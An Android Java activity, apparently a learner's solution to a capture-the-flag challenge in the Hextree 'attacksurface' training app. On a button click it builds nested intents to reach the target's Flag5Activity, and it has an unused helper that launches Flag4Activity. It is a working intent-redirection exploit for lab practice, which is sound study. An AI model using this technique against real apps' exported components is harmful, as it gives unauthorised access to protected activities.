// Logic of the challenge solution:
// OuterIntent
//  └── Extra: android.intent.extra.INTENT → InnerIntent
//          ├── Extra: return = 42
//          └── Extra: nextIntent → DeepIntent
//                     └── Extra: reason = "back"

package com.example.practicapp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    private int counting = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        b1.setOnClickListener(v -> {
            Intent deepIntent = new Intent();
            deepIntent.putExtra("reason", "back");

            // 2️⃣ Inner Intent (contains return + nextIntent)
            Intent innerIntent = new Intent();
            innerIntent.putExtra("return", 42);
            innerIntent.putExtra("nextIntent", deepIntent);

            // 3️⃣ Outer Intent (target Flag5Activity)
            Intent outerIntent = new Intent();
            outerIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag5Activity"
            );

            outerIntent.putExtra("android.intent.extra.INTENT", innerIntent);

            startActivity(outerIntent);
        });
    }
    private void launch(String action) {
        Intent i = new Intent();
        i.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
        );
        i.setAction(action);
        startActivity(i);
    }

}
